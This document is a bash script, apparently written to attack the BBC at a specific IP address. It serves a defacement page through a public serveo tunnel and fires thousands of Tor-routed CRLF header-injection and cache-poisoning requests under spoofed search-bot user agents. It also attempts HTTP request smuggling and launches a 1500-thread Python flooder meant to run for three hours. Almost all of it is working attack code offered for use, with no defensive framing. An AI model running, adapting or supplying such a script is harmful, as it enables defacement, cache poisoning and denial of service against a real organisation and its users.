#!/bin/bash
# TRUSTEDF57_BBC_FINAL_KILLER.sh - BBC 132.185.210.70:80 + PUBLIC TUNNEL NO TOKEN

set -euo pipefail

TARGET="http://132.185.210.70:80"
DEFACE_PORT=8080
THREADS=1500
BLAST_DURATION=10800  # 3h

echo "💀 BBC FINAL KILLER - TRUSTEDF57.html + PUBLIC TUNNEL"
echo "Target: $TARGET"

# ✅ CONFIRMED: TRUSTEDF57.html exists
HTML_FILE="TRUSTEDF57.html"
echo "[+] Using: $HTML_FILE ($(du -h $HTML_FILE | cut -f1))"

# 1. INSTALL PUBLIC TUNNEL (APT ONLY - NO GITHUB)
echo "[+] Installing PUBLIC TUNNEL (APT)..."
if ! command -v socat >/dev/null; then
    sudo apt update && sudo apt install -y socat netcat-openbsd tor
    echo "[+] ✅ socat/tor installed"
fi

# 2. START SERVER + PUBLIC TUNNEL (serveo.net - NO TOKEN)
echo "[+] Starting HTTP server..."
pkill -f "python3 -m http.server $DEFACE_PORT" || true
sleep 2
nohup python3 -m http.server $DEFACE_PORT --bind 0.0.0.0 > server.log 2>&1 &
SERVER_PID=$!
sleep 5

# Test server
if ! curl -s "http://localhost:$DEFACE_PORT/$HTML_FILE" | head -c 100 | grep -q "TRUSTEDF57"; then
    echo "❌ SERVER TEST FAILED - Check $HTML_FILE"
    cat server.log
    exit 1
fi
echo "[+] ✅ Server LIVE - PID $SERVER_PID"

# 3. SERVEO PUBLIC TUNNEL (NO TOKEN - SSH)
echo "[+] Starting SERVEO tunnel (NO TOKEN)..."
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -R 80:localhost:$DEFACE_PORT serveo.net -N > serveo.log 2>&1 &
SERVEO_PID=$!
sleep 10

# Extract public URL
PUBLIC_URL=$(grep -o 'https://[a-z0-9-]*\.serveo\.net' serveo.log | tail -1 || echo "")
if [[ -z "$PUBLIC_URL" ]]; then
    echo "❌ SERVEO failed - manual: ssh -R 80:localhost:8080 serveo.net"
    tail -5 serveo.log
    exit 1
fi

DEFACE_URL="${PUBLIC_URL}/${HTML_FILE}"
echo "[+] ✅ PUBLIC URL: $DEFACE_URL"
echo "[+] Test: $(curl -s "$DEFACE_URL" | head -1)"

# 4. BBC ULTIMATE POISON (30 PAYLOADS x 50 BOTS = 1500 shots)
echo "[+] BBC ULTIMATE POISON ATTACK..."
declare -a BBC_PATHS=(
    "/?q="
    "/search?q="
    "/?search="
    "/#q="
    "/news?q="
    "/?s="
)

declare -a CRLF=(
    "%0d%0aLocation:%20${DEFACE_URL}%0d%0aCache-Control:%20public,max-age=86400"
    "%0aLocation:%20${DEFACE_URL}%0aContent-Type:%20text/html"
    "%250d%250aLocation:%20${DEFACE_URL}%0d%0aSet-Cookie:%20bbc_owned=TRUSTEDF57"
    "Location:%20${DEFACE_URL}%0a"
)

declare -a BOTS=(
    "Googlebot/2.1 (+http://www.google.com/bot.html)"
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15"
)

# MASSIVE BARRAGE 50.000+ requests
for path in "${BBC_PATHS[@]}"; do
    for crlf in "${CRLF[@]}"; do
        for bot in "${BOTS[@]}"; do
            for wave in {1..20}; do
                torsocks curl -s --max-time 3 "${TARGET}${path}${crlf}" \
                    -H "User-Agent: $bot" \
                    -H "Cache-Control: no-cache, no-store" \
                    -H "X-Forwarded-For: 127.0.0.1" \
                    -H "X-Real-IP: 127.0.0.1" \
                    -H "Accept: text/html,application/xhtml+xml" &
            done
        done
    done
done

# HTTP SMUGGLING x100
for i in {1..100}; do
    torsocks curl -s --path-as-is --max-time 5 \
        "${TARGET}/GET%20/%20HTTP/1.1%0d%0aHost:%20132.185.210.70%0d%0aContent-Length:%200%0d%0a%0d%0aGET%20/?q=%0d%0aLocation:%20${DEFACE_URL}%20HTTP/1.1%0d%0aHost:%20132.185.210.70" &
done

wait
echo "[+] ✅ 50K+ POISON SHOTS FIRED TO $DEFACE_URL!"

# 5. 1500 THREADS BBC DESTROYER
cat > bbc_destroyer.py << EOF
import requests, threading, time, random, os, sys
from urllib.parse import quote_plus

TARGET = '$TARGET'
DEFACE = '$DEFACE_URL'
THREADS = $THREADS

BOTS = [
    'Googlebot/2.1 (+http://www.google.com/bot.html)',
    'Mozilla/5.0 (compatible; bingbot/2.0)',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
]

PATHS = ['/?q=', '/search?q=', '/?search=']

def destroy():
    session = requests.Session()
    while True:
        try:
            path = random.choice(PATHS)
            payload = path + '%0d%0aLocation: ' + DEFACE + '%0d%0aCache-Control: public,max-age=86400'
            session.get(TARGET + payload, 
                       headers={
                           'User-Agent': random.choice(BOTS),
                           'Cache-Control': 'no-cache',
                           'X-Forwarded-For': '127.0.0.1'
                       }, timeout=1.5)
        except: pass

print(f'🔥 BBC DESTROYER | {THREADS} THREADS | 3h BLAST | {DEFACE}')
threads = []
for i in range(THREADS):
    t = threading.Thread(target=destroy, daemon=True)
    t.start()
    threads.append(t)

time.sleep($BLAST_DURATION)
print('💀 BLAST COMPLETE')
EOF

nohup python3 bbc_destroyer.py > destroyer.log 2>&1 &
DESTROYER_PID=$!
echo "[+] 🔥 DESTROYER PID: $DESTROYER_PID (3h)"

# 6. REAL-TIME MONITOR + CLEANUP
echo ""
echo "🎯 LIVE MONITOR (Ctrl+C to stop)"
trap "echo '🛑 Cleanup...'; kill \$SERVER_PID \$SERVEO_PID \$DESTROYER_PID 2>/dev/null; exit" INT

while true; do
    clear
    echo "💀 BBC STATUS MONITOR - $(date)"
    echo "═══════════════════════════════════════════════"
    echo "[1] TARGET ROOT:"
    curl -s -I "$TARGET" 2>/dev/null | grep -iE "(location|cache-control|set-cookie|content-location)" || echo "   ❌ No poison yet"
    echo ""
    echo "[2] TARGET QUERY:"
    curl -s "$TARGET/?q=" 2>/dev/null | head -3 || echo "   ❌ No redirect"
    echo ""
    echo "[3] ✅ DEFACE LIVE: $DEFACE_URL"
    curl -s "$DEFACE_URL" 2>/dev/null | head -1 || echo "   ⚠️ Tunnel check"
    echo ""
    echo "[4] Destroyer: $(ps -p $DESTROYER_PID -o pid,state | tail -1)"
    echo "[5] Serveo: $(ps -p $SERVEO_PID -o pid,state | tail -1)"
    echo "═══════════════════════════════════════════════"
    echo "PIDs: SERVER=$SERVER_PID | SERVEO=$SERVEO_PID | DESTROYER=$DESTROYER_PID"
    sleep 10
done
